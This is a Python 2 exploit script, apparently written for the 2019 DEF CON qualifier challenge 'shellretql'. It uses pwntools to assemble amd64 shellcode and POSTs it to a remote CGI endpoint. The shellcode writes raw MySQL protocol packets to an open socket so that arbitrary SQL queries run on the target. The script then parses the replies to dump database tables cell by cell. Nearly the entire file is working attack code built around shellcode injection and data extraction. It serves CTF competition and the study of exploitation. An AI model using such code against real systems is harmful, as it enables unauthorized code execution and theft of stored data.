#!/usr/bin/env python2
from pwn import *
import requests
import re
import string
from pymysql.protocol import MysqlPacket
import unicodedata


context.arch = "amd64"
context.os = "linux"

SCHEMA = \
    ''' Players.Notes
Players.TellNotes
Players.Hands
Players.LastPlayed
Players.StatRecord
Players.StackSize
Players.Hero
Players.HandRangeNotes
Players.TableNotes
Players.QuickNotes'''.split('\n')

SCHEMA = [x.strip() for x in SCHEMA]


class TableDumper:

    def __init__(self, outfile_path=None):
        self.host = "http://shellretql.quals2019.oooverflow.io:9090/"
        self.path = "cgi-bin/index.php"
        self.url = self.host + self.path
        self.html = (
            'X-Powered-By: PHP/7.0.28-0ubuntu0.16.04.1\r\n'
            'Content-Type: text/html; charset=UTF-8\r\n\r\n'
            '<html></html>'
        )
        self.delim = 'scc'
        self.count_q = "select '{delim}',count({col}),'{delim2}' FROM {tbl};"
        self.cell_q = "select '{delim}',{col},'{delim2}' FROM {tbl} LIMIT 1 OFFSET {off};"
        self.encod = 'utf8'
        self.data = None
        self.last_r = None
        self.table_len = 0
        self.file_mode = 'a+'
        self.outfile_path = outfile_path
        self.outfile = None
        if self.outfile_path:
            self.get_file()

    def get_file(self):
        if self.file:
            self.file.close()
        self.file = open(self.outfile_path, self.file_mode)

    def write_line(self, line):
        self.file.write(line)

    def build_q(self, q):
        shellcode = ""
        shellcode += shellcraft.echo(p16(len(q)) + "\x00\x00\x03" + q, 4)
        shellcode += shellcraft.read(4, 'rsp', 200)
        shellcode += shellcraft.pushstr(self.html)
        shellcode += shellcraft.write(1, 'rsp', 500)
        self.data = {
            "shell": asm(shellcode) + "\x00"
        }
        return self.data

    def do_request(self):
        self.last_r = requests.post(self.url, data=self.data)
        return self.last_r

    def do_query(self, q):
        self.build_q(q)
        return self.do_request()

    def get_result(self, q):
        res = self.do_query(q)
        # kills unicode bytes
        res = unicodedata.normalize('NFKD', res.text).encode('ascii', 'ignore')
        res = MysqlPacket(res, self.encod).dump()
        return res.split(self.delim)[2].split(self.delim[::-1])[0]

    def trim(self, s):
        while s.startswith('.'):
            s = s[1:]
        while s.endswith('.'):
            s = s[:-1]
        if '...' in s:
            s = s.split('...')[0]
        return s

    def get_count(self, tbl, col, set_table_len=False):
        c = self.get_result(self.count_q.format(
            delim=self.delim, col=col, delim2=self.delim[::-1], tbl=tbl
        ))
        c = int(self.trim(c))
        if set_table_len:
            self.table_len = c
        return c

    def get_cell(self, tbl, col, off):
        q = self.cell_q.format(
            delim=self.delim, col=col, delim2=self.delim[::-1], tbl=tbl, off=off
        )
        return self.get_result(q)[3:]

    def dump_col(self, tbl, col):
        self.get_count(tbl, col, set_table_len=True)
        for off in range(self.table_len):
            r = self.get_cell(tbl, col, off)
            print self.trim(r)


if __name__ == '__main__':
    d = TableDumper()
    d.dump_col('PlrNote', 'Note')
